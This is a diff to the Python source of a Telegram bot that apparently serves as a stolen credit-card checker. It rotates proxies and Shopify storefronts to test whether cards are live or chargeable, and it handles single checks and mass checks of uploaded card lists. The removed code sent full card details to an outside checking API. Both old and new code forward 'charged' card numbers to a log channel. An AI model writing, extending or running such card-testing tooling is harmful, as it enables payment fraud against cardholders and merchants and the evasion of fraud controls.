@@ -103,11 +103,6 @@ PREMIUM_EMOJI_IDS = {
 def premium_emoji(text):
     return text
 
-SHOPIFY_APIS = [
-    "https://gates.valyrian.cc/autoshopify/curl/check",
-    "https://gates.valyrian.cc/autoshopify/tsl/check"
-]
-
 MASS_SESSIONS = {}
 
 API_ID = int(os.getenv("API_ID", "4055879"))
@@ -424,148 +419,7 @@ def format_anime_result(card_str, status_emoji, response_str, gateway_name, bran
 <b>⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» <code>{gateway_name}</code>
 <b>꫟ 𝙏𝙞𝙢𝙚</b> -» <code>{time_taken}'s</code>{user_tag}"""
 
-# ============================================================
-# GLOBAL VARIABLES - SIRF COUNT (PAUSE NAHI)
-# ============================================================
-API_FAIL_COUNT = 0
-API_FAIL_LOCK = asyncio.Lock()
 
-# ============================================================
-# check_card - PAUSE HATAYA, SIRF COUNT + RETRY
-# ============================================================
-async def check_card(card, site, proxy):
-    """Valyrian AutoShopify Engine - Direct Auto-Site & Proxy Check"""
-    global API_FAIL_COUNT
-    try:
-        parts = card.split('|')
-        if len(parts) != 4:
-            return {
-                'status': 'Site Error',
-                'message': 'Invalid card format',
-                'card': card,
-                'site': site,
-                'gateway': 'AutoShopify',
-                'price': '-',
-                'retry': True
-            }
-
-        api_url = random.choice(SHOPIFY_APIS)
-        url = f"{api_url}?site={site}&card={card}&proxy={proxy}"
-        timeout = aiohttp.ClientTimeout(total=10)
-
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
-                raw = await resp.json(content_type=None)
-
-        status_raw = str(raw.get('status', '')).upper()
-        message = str(raw.get('message', raw.get('reason', ''))).strip()
-        charged = raw.get('charged', False)
-        amount = str(raw.get('amount', '-'))
-        currency = str(raw.get('currency', '$'))
-        if currency == "USD":
-            currency = "$"
-        price = f"{currency}{amount}" if amount != "-" else "-"
-        gate = raw.get('payment_gateway', raw.get('gate', 'AutoShopify'))
-        site_name = raw.get('site', site)
-
-        # Check for proxy or endpoint error
-        if status_raw == "ERROR" or "proxy_required" in message.lower() or "proxy error" in message.lower():
-            return {
-                "status": "Site Error",
-                "message": message[:150] if message else "Proxy Error",
-                "card": card,
-                "retry": True,
-                "gateway": gate,
-                "price": price,
-                "site": site_name
-            }
-
-        # Charged
-        if charged or status_raw == "CHARGED" or "charged" in message.lower():
-            return {
-                'status': 'Charged',
-                'message': message[:150] if message else "Charged",
-                'card': card,
-                'site': site_name,
-                'gateway': gate,
-                'price': price,
-                'retry': False
-            }
-
-        # Approved / Live
-        if status_raw == "APPROVED" or any(x in message.lower() for x in ['approved', 'otp_required', 'incorrect_cvv', 'invalid_cvv', 'incorrect_zip']):
-            return {
-                'status': 'Approved',
-                'message': message[:150] if message else "Approved",
-                'card': card,
-                'site': site_name,
-                'gateway': gate,
-                'price': price,
-                'retry': False
-            }
-
-        # Declined / Dead
-        return {
-            'status': 'Dead',
-            'message': message[:150] if message else "CARD_DECLINED",
-            'card': card,
-            'site': site_name,
-            'gateway': gate,
-            'price': price,
-            'retry': False
-        }
-
-    except Exception as e:
-        return {
-            'status': 'Site Error',
-            'message': f'Error: {str(e)[:80]}',
-            'card': card,
-            'retry': True,
-            'gateway': 'AutoShopify',
-            'price': '-',
-            'site': site
-        }
-
-
-async def check_card_with_retry(card, sites, proxies, max_retries=20):
-    """Check a card with automatic retry - API ROTATION + SITE TRACKING (PAUSE NAHI)"""
-    if not sites:
-        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': ' ', 'price': '-', 'site': None}
-    if not proxies:
-        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': ' ', 'price': '-', 'site': None}
-
-    used_sites = set()
-    used_proxies = set()
-
-    for attempt in range(max_retries):
-        #  NAYA SITE CHUNO
-        available_sites = [s for s in sites if s not in used_sites]
-        if not available_sites:
-            break
-        site = random.choice(available_sites)
-        used_sites.add(site)
-        
-        #  NAYA PROXY CHUNO
-        available_proxies = [p for p in proxies if p not in used_proxies]
-        if not available_proxies:
-            break
-        proxy = random.choice(available_proxies)
-        used_proxies.add(proxy)
-        
-        #  CHECK CARD (ANDAR API FAIL COUNT HAI)
-        result = await check_card(card, site, proxy)
-        result['site'] = site
-
-        #  AGAR SUCCESS  RETURN
-        if not result.get('retry'):
-            return result
-
-        #  AGAR RETRY CHAHIYE  NEXT ATTEMPT
-        if attempt < max_retries - 1:
-            await asyncio.sleep(0.1)
-
-    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': ' ', 'price': '-', 'site': None}
-    
 async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
     """@Theonlysuui CHECKER - Real IST Time instead of Elapsed"""
     
@@ -1833,42 +1687,17 @@ async def single_chk_cc(event):
         return
 
     card = cards[0]
-    status_msg = await event.reply("<b>Shopify Checking...</b>", parse_mode="html")
+    status_msg = await event.reply("🔄 <b>Checking (Shopify Storefront)...</b>", parse_mode="html")
 
     sites = get_checker_sites(user_id)
     proxies = load_proxies(user_id)
+    proxy = random.choice(proxies) if proxies else None
+    custom_site = random.choice(sites) if sites else None
 
-    if not sites:
-        await status_msg.edit("""<b>⚠️ SHOPIFY SITES REQUIRED</b>
-━━━━━━━━━━━━━━━━━━━━
-❌ <b>No Shopify Sites Found!</b>
-
-💡 <b>How to add sites before using the checker:</b>
-• <code>/addsite https://yoursite.com</code> (Single Site)
-• Reply <code>/addsites</code> to a <code>.txt</code> file with site links (Bulk Sites)
-
-📌 <i>Make sure you have added active Shopify sites before using the checker!</i>""", parse_mode="html")
-        return
-    if not proxies:
-        await status_msg.edit("""<b>⚠️ PROXIES REQUIRED</b>
-━━━━━━━━━━━━━━━━━━━━
-❌ <b>No Active Proxies Found!</b>
-
-💡 <b>How to add proxies before using the checker:</b>
-• <code>/addproxy ip:port</code>
-• <code>/addproxy ip:port:user:pass</code>
-
-📌 <i>Please add active proxies to your pool before using the checker!</i>""", parse_mode="html")
-        return
-
+    start_time = time.time()
     try:
-        try:
-            result = await asyncio.wait_for(check_card_with_retry(card, sites, proxies, max_retries=1), timeout=20)
-        except asyncio.TimeoutError:
-            result = {'status': 'Dead', 'message': 'Gateway Timeout (20s limit)', 'card': card, 'price': '-'}
-        except Exception as ex:
-            result = {'status': 'Dead', 'message': f'Error: {ex}', 'card': card, 'price': '-'}
-
+        st, response_msg, gateway_str = await check_card_msh(card, proxy_str=proxy, custom_site=custom_site)
+        time_taken = round(time.time() - start_time, 2)
         update_daily_usage(user_id, 1)
 
         cc_num = card.split('|')[0]
@@ -1877,25 +1706,30 @@ async def single_chk_cc(event):
         except Exception:
             brand, bin_type, level, bank, country, flag = "-", "-", "-", "-", "-", "🏳️"
 
-        status_str = result.get('status', 'Declined')
-        is_charged = status_str in ('Charged', 'Approved', 'CVV Live', 'approved')
-        status_emoji = "Approved! ✅ -» charged!" if status_str == 'Charged' else ("Approved! ✅" if is_charged else "Declined! ❌")
-        response_msg = str(result.get('message', 'Declined'))[:150]
-        price = result.get('price', 'Auto')
+        st_lower = str(st).lower()
+        if st_lower == 'charged':
+            status_emoji = "Charged! 🟢"
+        elif st_lower == 'approved':
+            if "3DS" in response_msg or "OTP" in response_msg:
+                status_emoji = "Live! 🟡"
+            else:
+                status_emoji = "Approved! ✅ -» Auth"
+        else:
+            status_emoji = "Declined! ❌"
 
-        res_msg = format_anime_result(card, status_emoji, response_msg, f"Shopify -» {price}", brand, bin_type, level, bank, country, flag, "1.2", sender)
+        res_msg = format_anime_result(card, status_emoji, response_msg, f"{gateway_str} -» $0.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
         await status_msg.edit(res_msg, parse_mode="html")
 
         # Forward charged hits to log channel
-        if is_charged:
+        if st_lower == 'charged':
             try:
-                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Shopify\nAmount: {price}\nResponse: {response_msg}\nUser: {user_id}"""
+                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: {gateway_str}\nResponse: {response_msg}\nUser: {user_id}"""
                 await bot.send_message("Fchker", hit_log, parse_mode="html")
             except:
                 pass
 
     except Exception as e:
-        await status_msg.edit(f"Error: {e}")
+        await status_msg.edit(f"❌ Error: {e}")
 
 
 
@@ -2886,7 +2720,7 @@ async def checker_menu_handler(event):
 Browse the available categories:
 • <b>Auth Gates:</b> 7
 • <b>Charge Gates:</b> 15
-• <b>Mass Checker:</b> 6"""
+• <b>Mass Checker:</b> 7"""
 
     buttons = [
         [Button.inline("Auth Gates", b"auth_info"),
@@ -3219,241 +3053,17 @@ async def silent_log_forward_file(event):
 async def mass_chk_reply(event):
     if not event.is_reply:
         await event.reply("""<b>Shopify Auth Gate</b>
-
+━━━━━━━━━━━━━━━━━━━━
 <b>Single:</b> <code>/chk card|mm|yy|cvv</code>
 <b>Mass:</b> Reply <code>/chk</code> to a .txt file""", parse_mode="html")
         return
 
     reply_msg = await event.get_reply_message()
     if not reply_msg or not reply_msg.file:
-        await event.reply("Reply to a file containing cards!")
+        await event.reply("Reply to a .txt file containing cards!")
         return
 
-    user_id = event.sender_id
-    if not await is_joined_channel(user_id):
-        await event.reply("Join channel and /verify first!")
-        return
-
-    status_msg = await event.reply("<b>\u23f3 Starting mass check...</b>", parse_mode="html")
-
-    try:
-        buf = BytesIO()
-        await reply_msg.download_media(file=buf)
-        text = buf.getvalue().decode('utf-8', errors='ignore')
-        cards = extract_cc(text)
-
-        if not cards:
-            await status_msg.edit("No valid cards found in file!")
-            return
-
-        sites = get_checker_sites(user_id)
-        proxies = load_proxies(user_id)
-        if not sites:
-            await status_msg.edit("""<b>⚠️ SHOPIFY SITES REQUIRED</b>
-━━━━━━━━━━━━━━━━━━━━
-❌ <b>No Shopify Sites Found!</b>
-
-💡 <b>How to add sites before using the checker:</b>
-• <code>/addsite https://yoursite.com</code> (Single Site)
-• Reply <code>/addsites</code> to a <code>.txt</code> file with site links (Bulk Sites)
-
-📌 <i>Make sure you have added active Shopify sites before using the checker!</i>""", parse_mode="html")
-            return
-        if not proxies:
-            await status_msg.edit("""<b>⚠️ PROXIES REQUIRED</b>
-━━━━━━━━━━━━━━━━━━━━
-❌ <b>No Active Proxies Found!</b>
-
-💡 <b>How to add proxies before using the checker:</b>
-• <code>/addproxy ip:port</code>
-• <code>/addproxy ip:port:user:pass</code>
-
-📌 <i>Please add active proxies to your pool before using the checker!</i>""", parse_mode="html")
-            return
-
-        total = len(cards)
-        charged = 0
-        approved = 0
-        declined = 0
-        errors = 0
-        checked_count = 0
-
-        session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        start_time_ts = time.time()
-        active_proxies_count = len(proxies)
-
-        paused_evt = asyncio.Event()
-        paused_evt.set()
-        MASS_SESSIONS[session_id] = {
-            "status": "CHECKING",
-            "paused_event": paused_evt,
-            "user_id": user_id
-        }
-
-        def make_progress_bar(pct, length=20):
-            filled = int(length * pct / 100)
-            return "[" + "=" * filled + " " * (length - filled) + "]"
-
-        control_buttons = [
-            [
-                Button.inline("Pause", f"chk_pause_{session_id}"),
-                Button.inline("Resume", f"chk_resume_{session_id}"),
-                Button.inline("Stop", f"chk_stop_{session_id}")
-            ]
-        ]
-
-        # Immediately edit status message to initial progress UI at 0%
-        initial_ui = f"""━━━━━━━━━━━━━━━━━━━━
-<b>Gateway</b> -> Shopify
-<b>Status</b> -> CHECKING
-<b>Mode</b> -> Approved + Charged
-
-<b>PROGRESS</b>
-[                    ] 0%
-<b>Checked</b> -> 0/{total}
-<b>Approved</b> -> 0
-<b>CHARGED</b> -> 0
-<b>Dead</b> -> 0
-<b>Errors</b> -> 0
-<b>Time</b> -> 0s
-<b>Proxies</b> -> {active_proxies_count} / {active_proxies_count} active
-━━━━━━━━━━━━━━━━━━━━
-<b>Session ID</b> -> {session_id}"""
-        try:
-            await status_msg.edit(initial_ui, buttons=control_buttons, parse_mode="html")
-        except:
-            pass
-
-        is_running = True
-
-        # Real-time UI update background loop (edits message every 3 seconds)
-        async def ui_ticker():
-            while is_running:
-                try:
-                    await asyncio.sleep(3)
-                    sess_info = MASS_SESSIONS.get(session_id)
-                    if not sess_info:
-                        break
-
-                    elapsed_sec = int(time.time() - start_time_ts)
-                    mins, secs = divmod(elapsed_sec, 60)
-                    time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
-
-                    pct = int((checked_count / total) * 100) if total > 0 else 0
-                    pbar = make_progress_bar(pct)
-                    current_st = sess_info.get("status", "CHECKING")
-
-                    progress_ui = f"""━━━━━━━━━━━━━━━━━━━━
-<b>Gateway</b> -> Shopify
-<b>Status</b> -> {current_st}
-<b>Mode</b> -> Approved + Charged
-
-<b>PROGRESS</b>
-{pbar} {pct}%
-<b>Checked</b> -> {checked_count}/{total}
-<b>Approved</b> -> {approved}
-<b>CHARGED</b> -> {charged}
-<b>Dead</b> -> {declined}
-<b>Errors</b> -> {errors}
-<b>Time</b> -> {time_str}
-<b>Proxies</b> -> {active_proxies_count} / {active_proxies_count} active
-━━━━━━━━━━━━━━━━━━━━
-<b>Session ID</b> -> {session_id}"""
-                    await status_msg.edit(progress_ui, buttons=control_buttons, parse_mode="html")
-                except Exception:
-                    pass
-
-        ticker_task = asyncio.create_task(ui_ticker())
-
-        # Optimized card checking worker pool (Semaphore=10 concurrent workers)
-        sem = asyncio.Semaphore(10)
-
-        async def worker(card):
-            nonlocal checked_count, charged, approved, declined, errors
-            sess_info = MASS_SESSIONS.get(session_id)
-            if not sess_info or sess_info["status"] == "STOPPED":
-                return
-
-            await sess_info["paused_event"].wait()
-            if sess_info["status"] == "STOPPED":
-                return
-
-            async with sem:
-                if MASS_SESSIONS.get(session_id, {}).get("status") == "STOPPED":
-                    return
-
-                try:
-                    result = await check_card_with_retry(card, sites, proxies, max_retries=2)
-
-                    status_str = result.get('status', 'Declined')
-
-                    if status_str in ('Charged', 'Approved'):
-                        if status_str == 'Charged':
-                            charged += 1
-                        else:
-                            approved += 1
-
-                        cc_num = card.split('|')[0]
-                        brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
-                        response_msg = str(result.get('message', ''))[:100]
-                        price = result.get('price', 'Auto')
-
-                        status_emoji = "Approved! ✅ -» charged!" if status_str == 'Charged' else "Approved! ✅"
-                        hit_msg = format_anime_result(card, status_emoji, response_msg, f"Shopify Auth -» {price}", brand, bin_type, level, bank, country, flag, "Live", event.sender)
-                        await event.reply(hit_msg, parse_mode="html")
-
-                        try:
-                            await bot.send_message("Fchker", hit_msg, parse_mode="html")
-                        except Exception:
-                            pass
-                    elif status_str in ('Error', 'Timeout'):
-                        errors += 1
-                    else:
-                        declined += 1
-
-                except Exception:
-                    errors += 1
-                finally:
-                    checked_count += 1
-
-        # Execute parallel workers
-        tasks = [worker(card) for card in cards]
-        await asyncio.gather(*tasks)
-
-        is_running = False
-        ticker_task.cancel()
-
-        elapsed_sec = int(time.time() - start_time_ts)
-        mins, secs = divmod(elapsed_sec, 60)
-        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
-        final_st = MASS_SESSIONS.get(session_id, {}).get("status", "COMPLETE")
-        if final_st == "CHECKING":
-            final_st = "COMPLETE"
-
-        final_ui = f"""━━━━━━━━━━━━━━━━━━━━
-<b>Gateway</b> -> Shopify
-<b>Status</b> -> {final_st}
-<b>Mode</b> -> Approved + Charged
-
-<b>SUMMARY</b>
-<b>Total Checked</b> -> {checked_count}/{total}
-<b>Approved</b> -> {approved}
-<b>CHARGED</b> -> {charged}
-<b>Dead</b> -> {declined}
-<b>Errors</b> -> {errors}
-<b>Time</b> -> {time_str}
-━━━━━━━━━━━━━━━━━━━━
-<b>Session ID</b> -> {session_id}"""
-
-        try:
-            await status_msg.edit(final_ui, parse_mode="html")
-        except:
-            pass
-
-        MASS_SESSIONS.pop(session_id, None)
-
-    except Exception as e:
-        await status_msg.edit(f"Mass check error: {e}")
+    await _run_generic_mass_check(event, "Shopify Storefront Mass Check", check_card_msh)
 
 
 @bot.on(events.CallbackQuery(pattern=r'^chk_(pause|resume|stop)_(.+)'))
